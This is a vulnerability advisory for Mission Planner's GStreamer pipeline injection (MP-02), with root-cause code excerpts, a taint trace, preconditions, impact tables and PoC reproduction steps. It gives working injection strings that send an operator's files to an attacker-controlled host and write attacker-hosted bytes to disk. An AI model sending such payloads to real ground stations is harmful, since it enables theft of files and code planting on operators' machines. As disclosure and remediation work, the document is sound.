# MP-02 — `VIDEO_STREAM_INFORMATION.uri` with a `gst://` prefix is passed verbatim to `gst_parse_launch`

| Field | Value |
|---|---|
| **Product** | Mission Planner (ArduPilot GCS, Windows / .NET) |
| **Severity** | **HIGH** — CVSS 3.1 **8.1** `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| **CWE** | CWE-94 (code injection) · CWE-78 (injection into a command-string interpreter) · CWE-20 · CWE-610 |
| **Affected** | `master` and every released Mission Planner. Latest release 1.3.83 (2025-09-10) |
| **Fixed in** | nothing yet |
| **Verified** | master `0cdb16308` (2026-09-08) |
| **Interaction** | None at trigger time. The operator must have opened the gimbal video panel once this session, after which a 1-second timer fires the pipeline automatically |
| **Platform** | Windows. Requires GStreamer present, which Mission Planner offers to install |
| **Status** | Live-tested against Mission Planner on Windows — local file read, network exfiltration, and attacker-to-target file write all confirmed |
| **Advisory** | [GHSA-78c7-f26c-229v](https://github.com/ArduPilot/MissionPlanner/security/advisories/GHSA-78c7-f26c-229v) |
| **Fix** | [`fix/mp-02-gst-pipeline-passthrough`](https://github.com/nicholasaleks/MissionPlanner/tree/fix/mp-02-gst-pipeline-passthrough) against `0cdb16308`, no PR opened yet |

---

## Demo

Both clips exercise the same sink; only the pipeline the attacker supplies differs.

**1. Arbitrary file read and network exfiltration**

<a href="https://www.youtube.com/watch?v=ZQHspN_ckcc">
  <img src="https://img.youtube.com/vi/ZQHspN_ckcc/maxresdefault.jpg" alt="MP-02 — gst:// pipeline injection to arbitrary file read and exfiltration" width="720"/>
</a>

▶ **[Watch on YouTube](https://www.youtube.com/watch?v=ZQHspN_ckcc)**

The PoC advertises a stream whose `uri` is
`gst://filesrc location=C:\Users\nick\Desktop\target.txt ! tcpclientsink host=192.168.2.64 port=9999`.
The operator opens the gimbal video panel once; the 1-second timer hands the string to
`gst_parse_launch()` with no further confirmation. Mission Planner reads the operator's file and
streams it to the attacker's listener, arriving in `recived.bin` in the terminal on the right.

**2. Attacker-to-target arbitrary file write**

<a href="https://www.youtube.com/watch?v=cS-YdvSk5Vo">
  <img src="https://img.youtube.com/vi/cS-YdvSk5Vo/maxresdefault.jpg" alt="MP-02 — gst:// pipeline injection to arbitrary file write" width="720"/>
</a>

▶ **[Watch on YouTube](https://www.youtube.com/watch?v=cS-YdvSk5Vo)**

The same sink, reversed: the `uri` becomes
`gst://souphttpsrc location=http://192.168.2.64:8080/payload.txt ! filesink location=C:\Users\nick\Desktop\from_attacker.txt`.
Mission Planner fetches attacker-hosted bytes over the operator's own network stack and writes them
to an attacker-chosen path. Combined with MP-01's `plugins\` amplifier, this write is a
code-execution path in its own right.

---

## Summary

Mission Planner caches every `VIDEO_STREAM_INFORMATION` it receives, then builds a GStreamer pipeline
from the message's `uri` field. If that URI begins with `gst://`, **the remainder is returned verbatim
as the pipeline string** and handed to `gst_parse_launch`, which instantiates whatever elements it
names.

An attacker who controls the string controls which GStreamer elements run, so `filesrc` reads the operator's files,
`curlhttpsink` exfiltrates them, `souphttpsrc` pulls attacker bytes in, and `filesink` writes them to
disk. All of it inside the Mission Planner process, as the operator.

A second, vulnerability sits underneath, even without the `gst://` escape hatch, the RTSP branch
interpolates the unquoted URI straight into a pipeline template, and `gst_parse_launch` treats
` ! ` as an element separator, so the URI can break out of its own token.

---

## Root cause

### 1. Every stream message is cached, unvalidated

```csharp
// ExtLibs/ArduPilot/Mavlink/CameraProtocol.cs:287-290
case MAVLink.MAVLINK_MSG_ID.VIDEO_STREAM_INFORMATION:
    var video_stream_info = (MAVLink.mavlink_video_stream_information_t)message.data;
    VideoStreams[(parent.sysid, parent.compid, video_stream_info.stream_id)] = video_stream_info;
    break;
```

Keyed by `(sysid, compid, stream_id)` into the static dictionary declared at `:35`. Nothing inspects
`uri`.

### 2. The `gst://` passthrough

```csharp
// ExtLibs/ArduPilot/Mavlink/CameraProtocol.cs:37-47
public static string GStreamerPipeline(MAVLink.mavlink_video_stream_information_t stream)
{
    var type = (MAVLink.VIDEO_STREAM_TYPE)stream.type;
    var uri = System.Text.Encoding.UTF8.GetString(stream.uri).Split('\0')[0];   // :40

    // Allow a uri that starts with "gst://" to be used directly as a GStreamer pipeline
    // (this is my personal hack to allow for custom pipelines for testing)
    if (uri.StartsWith("gst://"))                                              // :44
    {
        return uri.Substring("gst://".Length);                                 // :46  verbatim
    }
```

`:40` decodes the attacker-controlled `byte[160]`. `:46` returns the remainder with no validation,
sanitisation or allow-listing. That return value is the pipeline.

### 3. The unquoted interpolation, reachable even without `gst://`

```csharp
// ExtLibs/ArduPilot/Mavlink/CameraProtocol.cs:71-86
case MAVLink.VIDEO_STREAM_TYPE.RTSP:
    uri = "rtsp://" + Regex.Replace(uri, "^.*://", "");
    return $"rtspsrc location={uri} latency=41 ... ! appsink name=outsink sync=false";   // :73
...
case MAVLink.VIDEO_STREAM_TYPE.TCP_MPEG:
    var match = Regex.Match(uri, @"^(?:.*://)?([^:/]+):(\d+)");
    if (match.Success)
    {
        return $"tcpclientsrc host={match.Groups[1].Value} port={match.Groups[2].Value} ! ...";  // :84
    }
```

`:73` drops the URI into `location=` unquoted, and `gst_parse_launch` treats ` ! ` as an element
separator, so the URI can close the `rtspsrc` token and append elements. `:84` is narrower because
the regex confines the host to `[^:/]+`, but that class still admits spaces and `!`.

The template appends its own trailing properties after the injected text (` latency=41 udp-reconnect=1 …` for RTSP,
` port={digits} ! decodebin …` for TCP_MPEG), so those have to be absorbed by whatever element ends
the injected chain or the pipeline fails to parse. The other branches are not affected, the UDP
and MPEG-TS paths parse `port` as an integer and range-check it at `:61-66`.

### 4. The sink

```csharp
// ExtLibs/Utilities/GStreamer.cs:1184-1188
public Thread Start(string stringpipeline)
{
    Stop();
    _backgroundWorker = new Thread(ThreadStart) {IsBackground = true, Name = "gstreamer"};
    _backgroundWorker.Start(stringpipeline);
```

```csharp
// ExtLibs/Utilities/GStreamer.cs:1234-1237
log.InfoFormat("GStreamer parse {0}", stringpipeline);
var pipeline = NativeMethods.gst_parse_launch(
    stringpipeline,
    out error);
```

`stringpipeline` is exactly the bytes from `:46`.

### 5. The trigger fires on a timer, with no confirmation

```csharp
// Controls/GimbalVideoControl.cs:765-793
private void AutoConnectTimerCallback(object sender, System.Timers.ElapsedEventArgs e)
{
    if (CameraProtocol.VideoStreams.Count < 1)
    {
        selectedCamera?.RequestCameraInformationAsync().Wait();   // ask, then come back
        AutoConnectTimer.Start();
        return;
    }

    string previous_stream = Settings.Instance["gimbal_video_stream", ""];
    foreach (var stream in CameraProtocol.VideoStreams.Values)
    {
        if (System.Text.Encoding.UTF8.GetString(stream.uri).Split('\0')[0] == previous_stream)
        {
            _stream.Start(CameraProtocol.GStreamerPipeline(stream));           // :785
            return;
        }
    }

    var first_stream = CameraProtocol.VideoStreams.First().Value;
    Settings.Instance["gimbal_video_stream"] = ...;
    _stream.Start(CameraProtocol.GStreamerPipeline(first_stream));             // :793
```

The timer is armed in the constructor at `:122-128` with `Interval = 1000`. Mission Planner not only
consumes a stream it was sent, it **asks for one** when it has none. There is no prompt anywhere on
this path.

### 6. What arms the timer, and what disarms it

```csharp
// Controls/GimbalVideoControl.cs:113-117
if (!initializeGStreamer())
{
    // No point in doing anything else if GStreamer isn't available
    return;                      // constructor returns before the timer is armed
}
```

`GimbalVideoControl` is constructed lazily when the operator opens the gimbal video panel
(`GCSViews/FlightData.cs:6576`). If GStreamer is absent, the constructor returns early and the sink
is unreachable.

### 7. Field width

`VIDEO_STREAM_INFORMATION` is message 269 (`ExtLibs/Mavlink/Mavlink.cs:633`) and `uri` is
`byte[160]` (`:28711-28712`), so the attacker gets 154 usable bytes after the `gst://` prefix. That
is ample for `filesrc location=… ! curlhttpsink location=http://…`.

---

## Taint trace

```
[wire]  VIDEO_STREAM_INFORMATION (msg 269), uri = byte[160]      Mavlink.cs:633, :28711
   v
CameraProtocol message handler                                    CameraProtocol.cs:287
   '-- VideoStreams[(sysid, compid, stream_id)] = info            CameraProtocol.cs:289   (cached, unvalidated)
   v
GimbalVideoControl.AutoConnectTimerCallback  (1 s timer)          GimbalVideoControl.cs:765
   |   armed in the ctor at :122-128, only if GStreamer is present (:113-117)
   |   requests CAMERA_INFORMATION itself when no stream is cached
   v
CameraProtocol.GStreamerPipeline(stream)                          CameraProtocol.cs:37
   |-- uri = UTF8(stream.uri).Split('\0')[0]                      CameraProtocol.cs:40
   |-- if (uri.StartsWith("gst://")) return uri.Substring(6)      CameraProtocol.cs:44-46   <- VERBATIM
   '-- else RTSP branch interpolates uri unquoted into location=  CameraProtocol.cs:73      <- ' ! ' breakout
   v
GStreamer.Start(stringpipeline)                                   GStreamer.cs:1184
   v
NativeMethods.gst_parse_launch(stringpipeline, out error)         GStreamer.cs:1235
   ===> ARBITRARY GSTREAMER PIPELINE RUNS IN THE MISSION PLANNER PROCESS
```

---

## Preconditions

| Condition | Default? | Notes |
|---|---|---|
| MAVLink link delivering message 269 | n/a | Any connected vehicle, component, or MITM. Push, no handshake |
| MP accepts any `sysid`/`compid` | **Yes** | Camera messages from the active link are processed with no per-sender authentication |
| GStreamer installed and discoverable | **Often, not universal** | MP bundles a GStreamer downloader and gimbal/video users generally install it. Absent, the constructor returns at `:113-117`, the timer is never armed, and the sink is unreachable. This is the single biggest gate |
| Gimbal video panel opened once this session | **Operator action, one time** | Constructs `GimbalVideoControl` (`FlightData.cs:6576`) and arms the timer. Nothing further is needed |
| `curlhttpsink` / `filesink` present | **Yes in the stock bundle** | `curlhttpsink` ships in `gst-plugins-bad`; `filesink` is core. The `gst://` hatch makes *any* installed element usable |

**Calibration.** This is not zero-click on an arbitrary Mission Planner install. It needs GStreamer
present and the gimbal video panel opened once. For the population this code path exists to serve —
operators actually using gimbal or camera video — both are routine, and past that point the trigger
is fully automatic and unauthenticated.

---

## Impact

`gst_parse_launch` runs whatever elements the string names, inside the Mission Planner process and in
the operator's security context. Confirmed live:

- **Arbitrary local file read plus network exfiltration.** `filesrc location=<path> ! curlhttpsink
  location=http://attacker/` sends the operator's files off the machine.
- **Attacker-to-target file write.** `souphttpsrc location=http://attacker/payload ! filesink
  location=<path>` pulls remote bytes and writes them wherever the MP process can write.

Neither needs a second message or any operator action beyond having the panel open.

Bounding it:

| Claim | Holds? | Why |
|---|---|---|
| Arbitrary GStreamer pipeline execution | **Yes** | `:46` returns the attacker string verbatim to `gst_parse_launch` |
| Arbitrary local file read | **Yes** | confirmed with `filesrc` |
| Network exfiltration of read data | **Yes** | confirmed with `curlhttpsink` |
| Arbitrary file write | **Yes** | confirmed with `souphttpsrc ! filesink` |
| Zero-click on any install | **No** | needs GStreamer present and the panel opened once |
| Native code execution | **No** | limited to elements already installed. Powerful, but not arbitrary shellcode |
| Reachable without the `gst://` prefix | **Yes, narrower** | the RTSP `location=` interpolation at `:73` allows a ` ! ` breakout |
| Privilege escalation | **No** | runs as the operator |

---

## Version scope

| Version | `VIDEO_STREAM_INFORMATION` handler | `GStreamerPipeline` | `GStreamer.Start` | auto-connect timer |
|---|---|---|---|---|
| `master` `0cdb16308` (verified) | `CameraProtocol.cs:287` | `CameraProtocol.cs:37` | `GStreamer.cs:1184` | `GimbalVideoControl.cs:765` |
| 1.3.83 (latest release, 2025-09-10) | `:287` | `:37` | `:1184` | `:765` |

Every citation lands on the same line in both trees. Mission Planner publishes rolling tags rather
than per-release branches; 1.3.83 is commit `b78a7495`, and `master` has not moved since the commit
verified above.

---

## Reproduction

Authorized bench only. Requires `pymavlink`, and GStreamer installed on the Mission Planner host.

```bash
cd poc
python3 poc_G02_mp_gst_pipeline_exfil.py --listen 0.0.0.0:5760
```

Connect Mission Planner to the harness, open the gimbal video panel once, and wait for the 1-second
timer. The harness serves a `VIDEO_STREAM_INFORMATION` whose `uri` is a `gst://` pipeline; the bundled
examples read a file to a local collector and write a file from one.

Two notes. The panel must be opened at least once per session or the timer is never armed, which is
the most common reason this looks like it is not working. And if GStreamer is not installed the
constructor returns early and nothing happens at all.